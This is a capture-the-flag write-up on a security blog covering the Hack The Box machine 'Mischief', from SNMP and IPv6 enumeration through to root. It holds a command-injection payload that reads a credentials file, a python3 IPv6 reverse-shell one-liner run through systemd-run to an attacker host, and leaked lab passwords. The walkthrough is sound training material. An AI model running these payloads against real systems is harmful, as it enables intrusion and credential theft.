@@ -1,0 +1,331 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HTB - Mischief Write-up | bigb0ss</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Mischief Write-up" /><meta name="author" content="bigb0ss" /><meta property="og:locale" content="en_US" /><meta name="description" content="This was an insane difficulty box and had many tricky steps to fully compromise it. Good learning path for: UDP Service Enumeration SNMP to obtain IPv6 Address ICMP Data Exfiltration systemd-run Command" /><meta property="og:description" content="This was an insane difficulty box and had many tricky steps to fully compromise it. Good learning path for: UDP Service Enumeration SNMP to obtain IPv6 Address ICMP Data Exfiltration systemd-run Command" /><link rel="canonical" href="https://bigb0sss.github.io/posts/htb-mischief-writeup/" /><meta property="og:url" content="https://bigb0sss.github.io/posts/htb-mischief-writeup/" /><meta property="og:site_name" content="bigb0ss" /><meta property="og:image" content="https://bigb0sss.github.io/assets/img/post/htb/mischief/01_infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-05T08:36:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://bigb0sss.github.io/assets/img/post/htb/mischief/01_infocard.png" /><meta property="twitter:title" content="HTB - Mischief Write-up" /><meta name="twitter:site" content="@bigb0ss___" /><meta name="twitter:creator" content="@bigb0ss" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"headline":"HTB - Mischief Write-up","dateModified":"2020-11-05T08:36:00-05:00","description":"This was an insane difficulty box and had many tricky steps to fully compromise it. Good learning path for: UDP Service Enumeration SNMP to obtain IPv6 Address ICMP Data Exfiltration systemd-run Command","datePublished":"2020-11-05T08:36:00-05:00","@type":"BlogPosting","image":"https://bigb0sss.github.io/assets/img/post/htb/mischief/01_infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://bigb0sss.github.io/posts/htb-mischief-writeup/"},"url":"https://bigb0sss.github.io/posts/htb-mischief-writeup/","author":{"@type":"Person","name":"bigb0ss"},"@context":"https://schema.org"}</script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-QE26N8SZTJ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QE26N8SZTJ'); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/bigb0ss/bigb0ss.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">bigb0ss</a></div><div class="site-subtitle font-italic">OSCE | OSCP | Security Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.linkedin.com/in/danielsmin" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/bigb0sss" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bigb0ss___" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Mischief Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Mischief Write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Nov 5, 2020" > Nov 5, 2020 <i class="unloaded">2020-11-05T08:36:00-05:00</i> </span> by <span class="author"> bigb0ss </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 15, 2020" > Nov 15, 2020 <i class="unloaded">2020-11-15T18:13:06-05:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/01_infocard.png" class="post-preview-img"><p>This was an insane difficulty box and had many tricky steps to fully compromise it. Good learning path for:</p><ul><li>UDP Service Enumeration<li>SNMP to obtain IPv6 Address<li>ICMP Data Exfiltration<li><code class="language-plaintext highlighter-rouge">systemd-run</code> Command</ul><h2 id="recon">Recon</h2><h3 id="nmap">Nmap</h3><p>Let’s begin with an initial port scan:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.92
+<span class="go">
+PORT     STATE SERVICE VERSION
+</span><span class="gp">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey: 
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
+| http-auth: 
+| HTTP/1.0 401 Unauthorized\x0D
+|_  Basic realm=Test
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
+|_http-title: Site doesn't have a title (text/html).
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+</pre></table></code></div></div><p>Let’s also run a port scan against the UDP ports as well:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-sU</span> <span class="nt">-F</span> 10.10.10.92
+<span class="go">
+PORT    STATE SERVICE
+161/udp open  snmp
+</span></pre></table></code></div></div><h3 id="interesting-ports">Interesting Ports</h3><ul><li>HTTP (3366/TCP) - Website with Authentication Prompt. No easy credentials worked<li>SNMP (161/UDP) - Simple Network Management Protocol</ul><h3 id="snmp-credentials">SNMP (Credentials)</h3><p>By using <code class="language-plaintext highlighter-rouge">snmpwalk</code>, we can see the list of the SNMP information. Especially, it reveals a set of credentials <code class="language-plaintext highlighter-rouge">loki : godofmischiefisloki</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>snmpwalk <span class="nt">-v1</span> <span class="nt">-c</span> public 10.10.10.92
+<span class="go">
+...snip...
+
+iso.3.6.1.2.1.25.4.2.1.5.588 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
+iso.3.6.1.2.1.25.4.2.1.5.603 = ""
+
+...snip...
+</span></pre></table></code></div></div><p>Using the found credentials, we could log into the <code class="language-plaintext highlighter-rouge">http://10.10.10.92:3366</code> page and find another set of credentials <code class="language-plaintext highlighter-rouge">loki : trickeryanddeceit</code>; however, it was dead-end. Using both of the credentials for <code class="language-plaintext highlighter-rouge">SSH</code> did not work either.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/02_cred.png" alt="image" /></p><h3 id="snmp-ipv6">SNMP (IPv6)</h3><p>When we inspect the <code class="language-plaintext highlighter-rouge">snmpwalk</code> result again, we can see the hex-converted IPv6 address <code class="language-plaintext highlighter-rouge">222.173.190.239.0.0.0.0.2.80.86.255.254.185.104.27</code>:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="go">...snip
+
+iso.3.6.1.2.1.4.34.1.6.1.4.10.10.10.92 = INTEGER: 2
+iso.3.6.1.2.1.4.34.1.6.1.4.10.10.10.255 = INTEGER: 2
+iso.3.6.1.2.1.4.34.1.6.1.4.127.0.0.1 = INTEGER: 2
+iso.3.6.1.2.1.4.34.1.6.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 2
+iso.3.6.1.2.1.4.34.1.6.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.104.27 = INTEGER: 5
+iso.3.6.1.2.1.4.34.1.6.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.104.27 = INTEGER: 5
+
+...snip
+</span></pre></table></code></div></div><p>Use the following <code class="language-plaintext highlighter-rouge">Python</code> script to covert the numbers into hex:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="c1"># hexIPv6.py
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">hexIPv6</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">hexIPv6</span><span class="p">:</span>
+    <span class="n">ip</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))[</span><span class="mi">2</span><span class="p">:].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"."</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">ip</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ip</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
+</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python hexIPv6.py 222.173.190.239.0.0.0.0.2.80.86.255.254.185.104.27
+<span class="go">dead.beef.0000.0000.0250.56ff.feb9.681b
+</span></pre></table></code></div></div><h3 id="nmap-ipv6">Nmap (IPv6)</h3><p>Let’s run another scan against that IPv6 address. And this time, we can see the port 80 open.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="gp">$</span>nmap <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-6</span> <span class="nt">-sC</span> <span class="nt">-sV</span> dead:beef:0000:0000:0250:56ff:feb9:681b
+<span class="go">
+PORT   STATE SERVICE VERSION
+</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey: 
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 400 Bad Request
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Host script results:
+| address-info: 
+|   IPv6 EUI-64: 
+|     MAC address: 
+|       address: 00:50:56:b9:68:1b
+|_      manuf: VMware
+</span></pre></table></code></div></div><p>Let’s add the IPv6 address to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> in order to browse the HTTP (80/tcp) page in the browser.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>vi /etc/hosts
+<span class="go">
+127.0.0.1       localhost
+127.0.1.1       kali
+
+</span><span class="gp">#</span><span class="c">## htb</span>
+<span class="go">dead:beef:0000:0000:0250:56ff:feb9:681b mischief.htb
+</span></pre></table></code></div></div><p>Once we browse the page, we will be prompted with another login page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/03_login.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/04_login.png" alt="image" /></p><h2 id="initial-foothold">Initial Foothold</h2><h3 id="password-shuffling">Password Shuffling</h3><p>Currently, we have the following two (2) credentials:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="go">loki : godofmischiefisloki
+loki : trickeryanddeceit
+</span></pre></table></code></div></div><p>However, both of the credentials did not work on that newly found login page. But doing some common username with those passwords combo, we can find the user <code class="language-plaintext highlighter-rouge">administrator</code> is using the password <code class="language-plaintext highlighter-rouge">trickeryanddeceit</code> for that login page. And we are now redirected to the Command Execution Panel.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/05_rce.png" alt="image" /></p><h3 id="rce-sensitive-data-access">RCE (Sensitive Data Access)</h3><p>The page also gives some hint: <code class="language-plaintext highlighter-rouge">In my home directory, i have my password in a file called credentials, Mr Admin</code>. But it restricts which commands can be used. Using the following command, we can successfully obtain the new password (<code class="language-plaintext highlighter-rouge">lokiisthebestnorsegod</code>) for the <code class="language-plaintext highlighter-rouge">loki</code> user:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">ping -c 2 127.0.0.1;</span><span class="w"> </span><span class="nb">cat</span> /home/loki/c<span class="k">*</span><span class="p">;</span>
+</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/06_pass.png" alt="image" /></p><h3 id="ssh-loki">SSH (loki)</h3><p><b>user.txt</b></p><p>With this credenitals (<code class="language-plaintext highlighter-rouge">loki : lokiisthebestnorsegod</code>), we can now <code class="language-plaintext highlighter-rouge">ssh</code> into the host. And we can also read the <code class="language-plaintext highlighter-rouge">user.txt</code> flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/07_ssh.png" alt="image" /></p><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="loki--root-systemd-run">loki –&gt; root (systemd-run)</h3><p>Another password can be found in <code class="language-plaintext highlighter-rouge">loki</code>’s <code class="language-plaintext highlighter-rouge">.bash_history</code> file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/mischief/08_bashHistory.png" alt="image" /></p><p>I wanted to try that newly obtained password (<code class="language-plaintext highlighter-rouge">lokipasswordmischieftrickery</code>) for the <code class="language-plaintext highlighter-rouge">root</code> user, but <code class="language-plaintext highlighter-rouge">/bin/su</code> command was restricted for the <code class="language-plaintext highlighter-rouge">loki</code> user, and <code class="language-plaintext highlighter-rouge">SSH</code> as the <code class="language-plaintext highlighter-rouge">root</code> user with password was also restricted.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">loki@Mischief:~$</span><span class="w"> </span>su
+<span class="go">-bash: /bin/su: Permission denied
+</span></pre></table></code></div></div><p>By checking the <code class="language-plaintext highlighter-rouge">/bin/su</code> permission via <code class="language-plaintext highlighter-rouge">getfacl</code> command, we can see that the <code class="language-plaintext highlighter-rouge">loki</code> user cannot execute the command:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="gp">loki@Mischief:~$</span><span class="w"> </span>getfacl /bin/su
+<span class="go">getfacl: Removing leading '/' from absolute path names
+</span><span class="gp">#</span><span class="w"> </span>file: bin/su
+<span class="gp">#</span><span class="w"> </span>owner: root
+<span class="gp">#</span><span class="w"> </span>group: root
+<span class="gp">#</span><span class="w"> </span>flags: s--
+<span class="go">user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
+</span></pre></table></code></div></div><p><b>systemd-run</b></p><p>We can see that the <code class="language-plaintext highlighter-rouge">loki</code> user can run the <code class="language-plaintext highlighter-rouge">systemd-run</code> command, which is:</p><blockquote><p><strong>Systemd-run</strong>: If a command is run as transient scope unit, it will be executed by systemd-run itself as parent process and will thus inherit the execution environment of the caller.</p></blockquote><p>And another caveat for the network issue is that the <code class="language-plaintext highlighter-rouge">Mischief</code> host does not allow IPv4 outbound connection; however, it allows it via IPv6. And the <code class="language-plaintext highlighter-rouge">systemd-run</code> command will not give us interative shell acess, so we will create a reverse shell over IPv6 with it.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gp">loki@Mischief:~$</span><span class="w"> </span>systemd-run python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1017",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+<span class="go">==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
+Authentication is required to manage system services or other units.                                                                                                             
+Authenticating as: root
+Password: 
+==== AUTHENTICATION COMPLETE ===
+Running as unit: run-u11.service
+</span></pre></table></code></div></div><p>In our <code class="language-plaintext highlighter-rouge">ncat</code> lister, we will get the <code class="language-plaintext highlighter-rouge">root</code> shell.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="gp">root@kali:~/Documents/htb/box/mischief#</span><span class="w"> </span>ncat <span class="nt">-6</span> <span class="nt">-lvnp</span> 443
+<span class="go">Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Connection from dead:beef::250:56ff:feb9:5f3d.
+Ncat: Connection from dead:beef::250:56ff:feb9:5f3d:38456.
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+
+</span><span class="gp">#</span><span class="w"> </span>ifconfig
+<span class="gp">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;</span><span class="w">  </span>mtu 1500
+<span class="go">        inet 10.10.10.92  netmask 255.255.255.0  broadcast 10.10.10.255
+</span><span class="gp">        inet6 dead:beef::250:56ff:feb9:5f3d  prefixlen 64  scopeid 0x0&lt;global&gt;</span><span class="w">
+</span><span class="gp">        inet6 fe80::250:56ff:feb9:5f3d  prefixlen 64  scopeid 0x20&lt;link&gt;</span><span class="w">
+</span><span class="go">        ether 00:50:56:b9:5f:3d  txqueuelen 1000  (Ethernet)
+        RX packets 763  bytes 63135 (63.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 343  bytes 44280 (44.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></pre></table></code></div></div><p><b>root.txt</b></p><p>The <code class="language-plaintext highlighter-rouge">root.txt</code> flag wasn’t there as usual. But just simply using the <code class="language-plaintext highlighter-rouge">find</code> command we could find the actual location for the real <code class="language-plaintext highlighter-rouge">root.txt</code> file.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">The flag is not here, get a shell to find it!
+
+</span><span class="gp">#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt
+<span class="go">/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+/root/root.txt
+
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+<span class="gp">ae15&lt;REDACTED&gt;</span>7807
+</pre></table></code></div></div><h2 id="post-ex">Post-Ex</h2><h3 id="iptables">Iptables</h3><p>So I wanted to check why the IPv4 outbound was not allowed. It turned out to be only SNMP (UDP) and SSH, 3366 (TCP) are allowed for ingress and egress.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>iptables <span class="nt">-L</span>
+<span class="go">Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
+ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
+DROP       udp  --  anywhere             anywhere            
+ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
+ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:3366
+DROP       tcp  --  anywhere             anywhere            
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
+ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
+DROP       udp  --  anywhere             anywhere            
+ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
+ACCEPT     tcp  --  anywhere             anywhere             tcp spt:3366
+DROP       tcp  --  anywhere             anywhere   
